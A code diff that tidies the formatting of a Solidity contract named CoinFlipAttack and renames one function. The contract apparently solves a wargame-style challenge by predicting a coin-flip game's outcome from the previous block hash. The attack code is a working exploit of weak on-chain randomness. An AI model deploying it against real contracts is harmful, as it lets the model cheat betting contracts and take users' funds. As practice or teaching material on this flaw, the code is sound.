@@ -31,25 +31,25 @@ contract CoinFlip {
     }
 }
 
-contract CoinFlipAttack {     
-    CoinFlip public coinFlip;     
-    uint256 public consecutiveWins;     
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;     
-    constructor( address _coinfliptoken){         
-        coinFlip = CoinFlip(_coinfliptoken);     
-    }     
-    
-    function attack() public view returns (bool) 
-    {         
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlipResult = blockValue / FACTOR;
-        return coinFlipResult == 1;
+contract CoinFlipAttack {
+    CoinFlip public coinFlip;
+    uint256 public consecutiveWins;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    constructor( address _coinfliptoken){
+        coinFlip = CoinFlip(_coinfliptoken);
     }
-    
-    function fliped() public returns (bool) 
+
+    function attack() public view returns (bool)
     {
-        bool result = attack();
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlipResult = blockValue / FACTOR;
+        return coinFlipResult == 1;
+    }
+
+    function flipped() public returns (bool)
+    {
+        bool result = attack();
         consecutiveWins++;
-        return coinFlip.flip(result);     
-    } 
+        return coinFlip.flip(result);
+    }
 }
